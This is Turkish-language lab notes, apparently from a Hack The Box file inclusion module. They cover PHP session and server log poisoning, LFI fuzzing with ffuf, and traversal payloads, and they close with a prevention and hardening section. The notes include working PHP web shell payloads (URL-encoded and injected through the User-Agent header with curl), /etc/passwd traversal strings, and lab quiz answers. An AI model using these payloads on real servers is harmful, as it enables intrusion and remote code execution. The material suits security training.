![Pasted image 20241118025215.png](/img/user/resimler/Pasted%20image%2020241118025215.png)

## **PHP Session Poisoning**  

Çoğu PHP web uygulaması, backend'e kullanıcıyla ilgili belirli verileri tutabilen `PHPSESSID` cookie'lerini kullanır, böylece web uygulaması cookie'leri aracılığıyla kullanıcı detaylarını takip edebilir. Bu ayrıntılar back-end'de `session` dosyalarında saklanır ve Linux `'` ta `/var/lib/php/sessions/`, Windows'ta ise `C:\Windows\Temp\` dizinine kaydedilir. Kullanıcımızın verilerini içeren dosyanın adı, `sess_` önekine sahip `PHPSESSID` çerezimizin adıyla eşleşir. Örneğin, `PHPSESSID` çerezi `el4ukv0kqbvoirg7nkp4dncpk3` olarak ayarlanmışsa, diskteki konumu `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3` olacaktır.  

Bir PHP Session Poisoning saldırısında yapmamız gereken ilk şey PHPSESSID oturum dosyamızı incelemek ve kontrol edebileceğimiz ve zehirleyebileceğimiz herhangi bir veri içerip içermediğini görmektir. Bu yüzden, öncelikle oturumumuza ayarlanmış bir `PHPSESSID` cookie'miz olup olmadığını kontrol edelim:

![Pasted image 20241118025445.png](/img/user/resimler/Pasted%20image%2020241118025445.png)

Gördüğümüz gibi, `PHPSESSID` cookie değerimiz `nhhv8i0o6ua4g88bkdl9u1fdsd`, bu nedenle `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` adresinde saklanmalıdır. Bu oturum dosyasını LFI güvenlik açığı aracılığıyla dahil etmeyi deneyelim ve içeriğini görüntüleyelim:
![Pasted image 20241118025518.png](/img/user/resimler/Pasted%20image%2020241118025518.png)


Oturum dosyasının iki değer içerdiğini görebiliriz: `page`, seçilen dil sayfasını gösterir ve `preference`, seçilen dili gösterir. `Preference` değeri, herhangi bir yerde belirtmediğimiz ve otomatik olarak belirtilmesi gerektiği için kontrolümüz altında değildir. Ancak, `page` değeri bizim kontrolümüz altındadır, çünkü onu `?language=` parametresi aracılığıyla kontrol edebiliriz.  

`Page` değerini özel bir değer (örneğin `language parametresi`) olarak ayarlamayı deneyelim ve oturum dosyasında değişip değişmediğini görelim. Bunu, aşağıdaki gibi `?language=session_poisoning` belirtilmiş sayfayı ziyaret ederek yapabiliriz:

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Şimdi, içeriğine bakmak için oturum dosyasını bir kez daha dahil edelim:

![Pasted image 20241118025719.png](/img/user/resimler/Pasted%20image%2020241118025719.png)


Bu sefer oturum dosyası `es.php` yerine `session_poisoning` içeriyor, bu da oturum dosyasındaki `page` değerini kontrol edebildiğimizi doğruluyor. Bir sonraki adımımız oturum dosyasına PHP kodu yazarak `poisoning` adımını gerçekleştirmektir. Aşağıdaki gibi `?language=` parametresini URL kodlu bir web shell olarak değiştirerek temel bir PHP web shell yazabiliriz:

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

Son olarak, oturum dosyasını dahil edebilir ve bir komutu çalıştırmak için `&cmd=id` 'yi kullanabiliriz:

![Pasted image 20241118025833.png](/img/user/resimler/Pasted%20image%2020241118025833.png)


## Server Log Poisoning

Hem `Apache` hem de `Nginx` `access.log` ve `error.log` gibi çeşitli günlük dosyaları tutar. `access.log` dosyası, her bir isteğin `User-Agent` başlığı da dahil olmak üzere sunucuya yapılan tüm istekler hakkında çeşitli bilgiler içerir. İsteklerimizdeki `User-Agent` başlığını kontrol edebildiğimiz için, yukarıda yaptığımız gibi sunucu loglarını zehirlemek için kullanabiliriz.  

Zehirlendikten sonra, günlükleri LFI güvenlik açığı yoluyla dahil etmemiz gerekir ve bunun için günlükler üzerinde okuma erişimine sahip olmamız gerekir. `Nginx` günlükleri varsayılan olarak düşük ayrıcalıklı kullanıcılar (örneğin `www-data`) tarafından okunabilirken, `Apache` günlükleri yalnızca yüksek ayrıcalıklara sahip kullanıcılar (örneğin `root/` adm grupları) tarafından okunabilir. Ancak, eski veya yanlış yapılandırılmış `Apache` sunucularında, bu günlükler düşük ayrıcalıklı kullanıcılar tarafından okunabilir.  

Varsayılan olarak, `Apache` günlükleri Linux `'` ta `/var/log/apache2/` ve Windows'ta `C:\xampp\apache\logs\` içinde bulunurken, `Nginx` günlükleri Linux `'` ta `/var/log/nginx/` ve Windows'ta `C:\nginx\log\` içinde bulunur. Ancak, günlükler bazı durumlarda farklı bir konumda olabilir, bu nedenle bir sonraki bölümde tartışılacağı gibi konumlarını fuzz etmek için bir [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) kullanabiliriz.  

Şimdi `/var/log/apache2/access.log` dosyasından Apache erişim günlüğünü dahil etmeyi deneyelim ve ne elde ettiğimize bakalım:

![Pasted image 20241118030019.png](/img/user/resimler/Pasted%20image%2020241118030019.png)

Gördüğümüz gibi, günlüğü okuyabiliyoruz. Günlük, `remote IP adresini`, `request sayfasını`, `response kodunu` ve `User-Agent` başlığını içerir. Daha önce de belirtildiği gibi, `User-Agent` başlığı HTTP istek başlıkları aracılığıyla bizim tarafımızdan kontrol edilir, bu nedenle bu değeri zehirleyebilmeliyiz.  

**İpucu:** Günlükler genellikle çok büyüktür ve bir LFI güvenlik açığında bunların yüklenmesi biraz zaman alabilir, hatta en kötü senaryolarda sunucuyu çökertebilir. Bu nedenle, üretim ortamında dikkatli ve verimli olun ve gereksiz istekler göndermeyin.

Bunu yapmak için, daha önceki LFI isteğimizi kesmek ve `User-Agent` başlığını `Apache Log Poisoning` olarak değiştirmek için `Burp Suite` kullanacağız:

![Pasted image 20241118030117.png](/img/user/resimler/Pasted%20image%2020241118030117.png)

**Not:** Sunucuya gelen tüm istekler günlüğe kaydedildiğinden, yukarıda yaptığımız gibi LFI'ye değil, web uygulamasına gelen herhangi bir isteği zehirleyebiliriz.  

Beklendiği gibi, özel User-Agent değerimiz dahil edilen günlük dosyasında görülebilir. Şimdi, `User-Agent` başlığını temel bir PHP web shell'ine ayarlayarak zehirleyebiliriz:

![Pasted image 20241118030143.png](/img/user/resimler/Pasted%20image%2020241118030143.png)

Ayrıca aşağıdaki gibi cURL üzerinden bir istek göndererek de günlüğü zehirleyebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Günlük artık PHP kodu içerdiğinden, LFI güvenlik açığı bu kodu çalıştırmalı ve uzaktan kod çalıştırma elde edebilmeliyiz. (`?cmd=id`) ile çalıştırılacak bir komut belirtebiliriz:

![Pasted image 20241118030210.png](/img/user/resimler/Pasted%20image%2020241118030210.png)

Komutu başarıyla çalıştırdığımızı görüyoruz. Aynı saldırı `Nginx` logları üzerinde de gerçekleştirilebilir.  

**İpucu:** `User-Agent` başlığı Linux `/proc/` dizini altındaki proses dosyalarında da gösterilir. Dolayısıyla, `/proc/self/environ` veya `/proc/self/fd/N` dosyalarını (burada N genellikle 0-50 arasında bir PID'dir) dahil etmeyi deneyebilir ve aynı saldırıyı bu dosyalar üzerinde de gerçekleştirebiliriz. Bu, sunucu günlükleri üzerinde okuma erişimimiz olmaması durumunda kullanışlı olabilir, ancak bu dosyalar da yalnızca ayrıcalıklı kullanıcılar tarafından okunabilir olabilir.

Son olarak, hangi günlüklere okuma erişimimiz olduğuna bağlı olarak çeşitli sistem günlüklerinde kullanabileceğimiz başka benzer günlük zehirleme teknikleri de vardır. Aşağıdakiler okuyabileceğimiz bazı hizmet günlükleridir:  

- `/var/log/sshd.log`  
- `/var/log/mail`  
- `/var/log/vsftpd.log`

Öncelikle bu logları LFI aracılığıyla okumayı denemeliyiz ve eğer onlara erişimimiz varsa, yukarıda yaptığımız gibi onları zehirlemeyi deneyebiliriz. Örneğin, `ssh` veya `ftp` servisleri bize açıksa ve LFI aracılığıyla günlüklerini okuyabiliyorsak, bu servislere giriş yapmayı deneyebilir ve kullanıcı adını PHP koduna ayarlayabiliriz ve günlüklerini dahil ettiğimizde PHP kodu çalışacaktır. Aynı şey `mail` servisleri için de geçerlidir, PHP kodu içeren bir e-posta gönderebiliriz ve logları dahil edildiğinde PHP kodu çalışacaktır. Bu tekniği, kontrol ettiğimiz bir parametreyi kaydeden ve LFI açığı aracılığıyla okuyabileceğimiz tüm günlüklere genelleyebiliriz.


Soru : RCE elde etmek için bu bölümde ele alınan tekniklerden herhangi birini kullanın, ardından aşağıdaki komutun çıktısını gönderin: pwd
cevap : 

Soru : RCE elde etmek için farklı bir teknik kullanmayı deneyin ve / adresindeki bayrağı okuyun
Cevap : 

1- İsteği yakaladıktan sonra User-Agent kısmına web shellimizi yazıyoruz.

![Pasted image 20241118030414.png](/img/user/resimler/Pasted%20image%2020241118030414.png)

2- İsteğimizi Tekrardan yakalayıp web shel çalışacak hale getiriyoruz . (&cmd=id)

![Pasted image 20241118030435.png](/img/user/resimler/Pasted%20image%2020241118030435.png)

3- pwd komutu çalıştırıp ilk sorumuzun cevabını bulalım .

![Pasted image 20241118030442.png](/img/user/resimler/Pasted%20image%2020241118030442.png)

1- Hedef sistemin root dizininde bir ls çalıştıralım . ( ls /)

![Pasted image 20241118030453.png](/img/user/resimler/Pasted%20image%2020241118030453.png)

2- Txt dosyamızı okuyalım .

![Pasted image 20241118030526.png](/img/user/resimler/Pasted%20image%2020241118030526.png)


# Automated Scanning

```shell-session
M1R4CKCK@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Test ettiğimiz herhangi bir formla bağlantılı olmayan açık bir parametre belirledikten sonra, bu modülde tartışılan tüm LFI testlerini gerçekleştirebiliriz. Bu, LFI güvenlik açıklarına özgü olmayıp diğer modüllerde ele alınan çoğu web güvenlik açığı için de geçerlidir, çünkü açıkta kalan parametreler başka herhangi bir güvenlik açığına karşı da savunmasız olabilir.

**İpucu:** Daha hassas bir tarama için, taramamızı bu [bağlantıda](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters) bulunan en popüler LFI parametreleriyle sınırlayabiliriz.


## LFI wordlists

Bu tarama için kullanabileceğimiz bir dizi [LFI Kelime Listesi](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) vardır. İyi bir kelime listesi [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)'dir, çünkü çeşitli baypaslar ve ortak dosyalar içerir, bu nedenle aynı anda birkaç test çalıştırmayı kolaylaştırır. Bu kelime listesini, modül boyunca test ettiğimiz `?language=` parametresini bulanıklaştırmak için aşağıdaki gibi kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```


## **Fuzzing Server Files**  

LFI payloadlarını fuzzing'e ek olarak, LFI istismarımızda yardımcı olabilecek farklı sunucu dosyaları vardır, bu nedenle bu tür dosyaların nerede olduğunu ve bunları okuyup okuyamayacağımızı bilmek yararlı olacaktır. Bu tür dosyalar şunları içerir: `Sunucu webroot yolu`, `sunucu yapılandırma dosyası` ve `sunucu günlükleri`.


#### **Server Webroot**  

Bazı durumlarda istismarımızı tamamlamak için tam sunucu webroot yolunu bilmemiz gerekebilir. Örneğin, yüklediğimiz bir dosyayı bulmak istiyorsak, ancak `/uploads` dizinine göreceli yollarla ulaşamıyorsak (ör. `../../uploads`). Bu gibi durumlarda, sunucunun webroot yolunu bulmamız gerekebilir, böylece yüklediğimiz dosyaları göreli yollar yerine mutlak yollarla bulabiliriz.  

Bunu yapmak için, [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) veya [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) bu kelime listesinde bulabileceğimiz ortak webroot yolları aracılığıyla `index.php` dosyasını fuzz edebiliriz. LFI durumumuza bağlı olarak, birkaç arka dizin eklememiz (örneğin `../../../../`) ve ardından `index.php` dosyamızı eklememiz gerekebilir `.`  

Aşağıda tüm bunları ffuf ile nasıl yapabileceğimize dair bir örnek verilmiştir


```shell-session
M1R4CKCK@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

...SNIP...

: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Gördüğümüz gibi, tarama gerçekten de (`/var/www/html/`) adresindeki doğru webroot yolunu tespit etti. Daha önce kullandığımız [LFI-Jhaddix.txt](“https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt”) kelime listesini de kullanabiliriz, çünkü bu liste webroot'u ortaya çıkarabilecek çeşitli payload'lar da içermektedir. Eğer bu webroot'u belirlememize yardımcı olmazsa, o zaman en iyi seçimimiz sunucu yapılandırmalarını okumak olacaktır, çünkü daha sonra göreceğimiz gibi webroot ve diğer önemli bilgileri içerme eğilimindedirler.


#### **Server Logs/Configurations**  

Önceki bölümde gördüğümüz gibi, tartıştığımız log poisoning saldırılarını gerçekleştirebilmek için doğru log dizinini belirleyebilmemiz gerekir. Ayrıca, az önce tartıştığımız gibi, sunucu webroot yolunu ve diğer önemli bilgileri ( logs path gibi!) tanımlayabilmek için sunucu yapılandırmalarını da okumamız gerekebilir.  

Bunu yapmak için [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) kelime listesini de kullanabiliriz, çünkü bu liste ilgilenebileceğimiz sunucu günlüklerinin ve yapılandırma yollarının çoğunu içerir. Daha hassas bir tarama yapmak istiyorsak, [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) veya [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), bu kelime listesini kullanabiliriz, ancak bunlar `seclists`'in bir parçası değildir, bu yüzden önce onları indirmemiz gerekir. Linux kelime listesini LFI güvenlik açığımıza karşı deneyelim ve ne elde ettiğimize bakalım:

```shell-session
M1R4CKCK@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
 :: Wordlist         : FUZZ: ./LFI-WordList-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2287
________________________________________________

/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
...SNIP...
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
```

Gördüğümüz gibi, tarama 60'tan fazla sonuç döndürdü, bunların çoğu [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) kelime listesi ile tanımlanmadı, bu da bize bazı durumlarda hassas bir taramanın önemli olduğunu gösteriyor. Şimdi, içeriklerini alıp alamayacağımızı görmek için bu dosyalardan herhangi birini okumayı deneyebiliriz. Apache sunucu yapılandırması için bilinen bir yol olduğu için (`/etc/apache2/apache2.conf`) dosyasını okuyacağız:

```shell-session
M1R4CKCK@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
```

Gördüğümüz gibi, varsayılan webroot yolunu ve günlük yolunu alıyoruz. Ancak, bu durumda, günlük yolu, yukarıda gördüğümüz başka bir dosyada (`/etc/apache2/envvars`) bulunan global bir apache değişkenini (`APACHE_LOG_DIR`) kullanıyor ve değişken değerlerini bulmak için onu okuyabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars

...SNIP...
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
# temporary state file location. This might be changed to /run in Wheezy+1
export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

Gördüğümüz gibi, (`APACHE_LOG_DIR`) değişkeni (`/var/log/apache2`) olarak ayarlanmıştır ve önceki yapılandırma bize günlük dosyalarının önceki bölümde erişilen `/access.` log ve `/error.`log olduğunu söylemiştir.


## **LFI Araçları**  

Son olarak, öğrendiğimiz sürecin çoğunu otomatikleştirmek için bir dizi LFI aracı kullanabiliriz, bu da bazı durumlarda zaman kazandırabilir, ancak manuel test yoluyla tespit edebileceğimiz birçok güvenlik açığını ve dosyayı da gözden kaçırabilir. En yaygın LFI araçları [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak) ve [liffy'](https://github.com/mzfr/liffy)dir. GitHub'da diğer çeşitli LFI araçları ve komut dosyaları için de arama yapabiliriz, ancak genel olarak çoğu araç, değişen başarı ve doğruluk düzeyleriyle aynı görevleri yerine getirir.  

Ne yazık ki, bu araçların çoğunun bakımı yapılmamaktadır ve eski `python2`'ye dayanmaktadır, bu nedenle bunları kullanmak uzun vadeli bir çözüm olmayabilir.


Soru : Açık parametreler için web uygulamasını fuzzlayın, ardından /flag.txt dosyasını okumak için LFI kelime listelerinden biriyle onu istismar etmeye çalışın
Cevap : 


1- Öncelikle çalışan bir parametre bulalım .
![Pasted image 20241118154230.png](/img/user/resimler/Pasted%20image%2020241118154230.png)

2-Bulduğumuz hedef urlye bir LFI açığı olup olmadığı test edelim .

![Pasted image 20241118154243.png](/img/user/resimler/Pasted%20image%2020241118154243.png)

3- Bir kaç çalışan payload keşfettik bunlardan birisini deneyerek flag.txt dosyamızı arayalım .

![Pasted image 20241118154252.png](/img/user/resimler/Pasted%20image%2020241118154252.png)

4- Curl kullanarak payloadımızın çalışıp çalışmadığına bakabilir.

![Pasted image 20241118154301.png](/img/user/resimler/Pasted%20image%2020241118154301.png)
![Pasted image 20241118154303.png](/img/user/resimler/Pasted%20image%2020241118154303.png)

![Pasted image 20241118154311.png](/img/user/resimler/Pasted%20image%2020241118154311.png)

6- Flag.txt dosyasını okuyalım .

![Pasted image 20241118154319.png](/img/user/resimler/Pasted%20image%2020241118154319.png)


# File Inclusion Prevention

Dosya ekleme güvenlik açıklarını azaltmak için yapabileceğimiz en etkili şey, kullanıcı tarafından kontrol edilen girdileri herhangi bir dosya ekleme işlevine veya API'ye geçirmekten kaçınmaktır. Sayfa, hiçbir kullanıcı etkileşimi olmadan back-end'deki varlıkları dinamik olarak yükleyebilmelidir. Ayrıca, bu modülün ilk bölümünde, bir sayfaya diğer dosyaları dahil etmek için kullanılabilecek farklı fonksiyonları tartıştık ve her fonksiyonun sahip olduğu ayrıcalıklardan bahsettik. Bu fonksiyonlardan herhangi biri kullanıldığında, hiçbir kullanıcı girdisinin doğrudan bu fonksiyonlara girmediğinden emin olmalıyız. Elbette, bu fonksiyon listesi kapsamlı değildir, bu nedenle genellikle dosyaları okuyabilen herhangi bir fonksiyonu dikkate almalıyız.

Bazı durumlarda, mevcut bir web uygulamasının tüm mimarisini değiştirmeyi gerektirebileceğinden bu mümkün olmayabilir. Bu gibi durumlarda, izin verilen kullanıcı girdilerinin sınırlı bir beyaz listesini kullanmalı ve diğer tüm girdiler için varsayılan bir değere sahipken her girdiyi yüklenecek dosyayla eşleştirmeliyiz. Mevcut bir web uygulamasıyla uğraşıyorsak, front-end'de kullanılan tüm mevcut yolları içeren bir whitelist oluşturabilir ve ardından kullanıcı girdisini eşleştirmek için bu listeyi kullanabiliriz. Böyle bir whitelist, ID'leri dosyalarla eşleştiren bir veritabanı tablosu, adları dosyalarla eşleştiren bir `case-match` script veya hatta eşleştirilebilecek adları ve dosyaları içeren statik bir json haritası gibi birçok şekle sahip olabilir.

Bu uygulandığında, kullanıcı girdisi fonksiyona girmez, ancak eşleşen dosyalar fonksiyonda kullanılır, bu da dosya ekleme güvenlik açıklarını önler.

## **Preventing Directory Traversal**

Saldırganlar dizini kontrol edebilirlerse, web uygulamasından kaçabilir ve daha aşina oldukları bir şeye saldırabilir veya `evrensel bir saldırı zinciri` kullanabilirler . Modül boyunca tartıştığımız gibi, dizin geçişi potansiyel olarak saldırganların aşağıdakilerden herhangi birini yapmasına izin verebilir:

- `/etc/passwd` dosyasını okuyarak SSH Anahtarlarını bulabilir veya parola spreyi saldırısı için geçerli kullanıcı adlarını öğrenebilirsiniz  
    
- Tomcat gibi kutudaki diğer hizmetleri bulun ve `tomcat-users.xml` dosyasını okuyun  
    
- Geçerli PHP Oturum Çerezlerini keşfetme ve oturum ele geçirme  
    
- Mevcut web uygulaması yapılandırmasını ve kaynak kodunu okuma

Dizin geçişini önlemenin en iyi yolu, yalnızca dosya adını almak için programlama dilinizin (veya framework'ün) yerleşik aracını kullanmaktır. Örneğin, PHP'de yolu okuyan ve sadece dosya adını `döndüren basename() fonksiyonu` vardır. Yalnızca dosya adı verilirse, yalnızca dosya adını döndürür. Eğer sadece yol verilmişse, sondaki / işaretinden sonrasını dosya adı olarak kabul eder. Bu yöntemin dezavantajı, uygulamanın herhangi bir dizin girmesi gerekiyorsa, bunu yapamayacak olmasıdır.  

Bu yöntemi uygulamak için kendi fonksiyonunuzu yaratırsanız, garip bir uç durumu hesaba katmamış olabilirsiniz. Örneğin, bash terminalinizde home dizininize gidin (cd ~) ve `cat .?/.*/.?/etc/passwd` komutunu çalıştırın `.` Bash'in `?` ve `*` joker karakterlerinin `.` olarak kullanılmasına izin verdiğini göreceksiniz. Şimdi PHP Komut Satırı yorumlayıcısına girmek için `php -a` yazın ve echo `file_get_contents('.?/.*/.?/etc/passwd');`. komutunu çalıştırın `.` PHP'nin joker karakterlerle aynı davranışa sahip olmadığını göreceksiniz, eğer `?` ve `*` yerine `.` koyarsanız, komut beklendiği gibi çalışacaktır `.` Bu, yukarıdaki işlevimizde bir uç durum olduğunu göstermektedir, eğer PHP'nin `system()` işleviyle bash çalıştırmasını sağlarsak, saldırgan dizin geçişi önlememizi atlayabilir. İçinde bulunduğumuz framework'e özgü işlevler kullanırsak, diğer kullanıcıların bunun gibi uç durumları yakalama ve web uygulamamızda istismar edilmeden önce düzeltme şansı vardır.

Ayrıca, dizinleri geçme girişimlerini özyinelemeli olarak kaldırmak için kullanıcı girdisini aşağıdaki gibi sterilize edebiliriz:

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

Gördüğümüz gibi, bu kod `../` alt dizelerini özyinelemeli olarak kaldırır, bu nedenle ortaya çıkan dize `../` içerse bile yine de kaldırır, bu da bu modülde denediğimiz bazı baypasları önler `.`


## **Web Server Configuration**  

Dosya ekleme güvenlik açıklarının ortaya çıkması durumunda bunların etkisini azaltmak için çeşitli yapılandırmalar da kullanılabilir. Örneğin, remote dosyaların dahil edilmesini global olarak devre dışı bırakmalıyız. PHP'de bu `allow_url_fopen` ve `allow_url_include` seçeneklerini Off olarak ayarlayarak yapılabilir.  

Web uygulamalarını kendi web root dizinlerine kilitleyerek web ile ilgili olmayan dosyalara erişmelerini engellemek de genellikle mümkündür. Günümüz çağında bunu yapmanın en yaygın yolu uygulamayı `Docker` içinde çalıştırmaktır. Ancak, bu bir seçenek değilse, birçok dilde genellikle web dizini dışındaki dosyalara erişimi engellemenin bir yolu vardır. PHP'de bu, php.ini dosyasına `open_basedir = /var/www` eklenerek yapılabilir. Ayrıca, [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html) gibi potansiyel olarak tehlikeli bazı modüllerin devre dışı bırakıldığından emin olmalısınız.  

Bu yapılandırmalar uygulanırsa, web uygulama klasörü dışındaki dosyalara erişim engellenecektir, böylece bir LFI güvenlik açığı tespit edilse bile etkisi azalacaktır.



## **Web Uygulaması Güvenlik Duvarı (WAF)**  

Uygulamaları güçlendirmenin evrensel yolu `ModSecurity` gibi bir Web Uygulaması Güvenlik Duvarı (WAF) kullanmaktır. WAF'larla uğraşırken, kaçınılması gereken en önemli şey yanlış pozitifler ve kötü niyetli olmayan isteklerin engellenmesidir. ModSecurity, yalnızca engelleyeceği şeyleri rapor edecek `izin verici` bir mod sunarak yanlış pozitifleri en aza indirir. Bu, savunucuların hiçbir meşru talebin engellenmediğinden emin olmak için kuralları ayarlamasına olanak tanır. Kuruluş WAF'ı hiçbir zaman “engelleme moduna” geçirmek istemese bile, sadece izin verme modunda olması uygulamanızın saldırıya uğradığına dair erken bir uyarı işareti olabilir.

Son olarak, sertleştirmenin amacının uygulamaya daha güçlü bir dış kabuk kazandırmak olduğunu unutmamak önemlidir, böylece bir saldırı gerçekleştiğinde savunucuların savunmak için zamanları olur. [FireEye M-Trends 2020 Raporu](“https://content.fireeye.com/m-trends/rpt-m-trends-2020”)'na göre, bir şirketin bilgisayar korsanlarını tespit etmesi için geçen ortalama süre 30 gündü. Uygun sertleştirme ile saldırganlar çok daha fazla işaret bırakacak ve kuruluşun bu olayları daha da hızlı tespit edeceği umulmaktadır.

Sertleştirmenin amacının sisteminizi hacklenemez hale getirmek olmadığını anlamak önemlidir, yani “güvenli” olduğu için sertleştirilmiş bir sistem üzerinde günlükleri izlemeyi ihmal edemezsiniz. Güçlendirilmiş sistemler, özellikle sisteminizle ilgili bir uygulama için sıfırıncı gün yayınlandıktan sonra sürekli olarak test edilmelidir (örn: Apache Struts, RAILS, Django, vb.). Çoğu durumda, sıfırıncı gün işe yarayacaktır, ancak sertleştirme sayesinde, istismarın sisteme karşı kullanılıp kullanılmadığını doğrulamayı mümkün kılan benzersiz günlükler oluşturabilir.

Soru : Apache için php.ini dosyasının tam yolu nedir?
Cevap : /etc/php/7.4/apache2/php.ini

1- ssh ile hedef sisteme bağlanalım . (ssh kullanıcıadı@Target_IP → yes → password) . Ardından php.ini dosyamızı arayalım . Hedef sistemde “locate” kodu çalışmadığından find komutu işimizi görür.

![Pasted image 20241118160443.png](/img/user/resimler/Pasted%20image%2020241118160443.png)

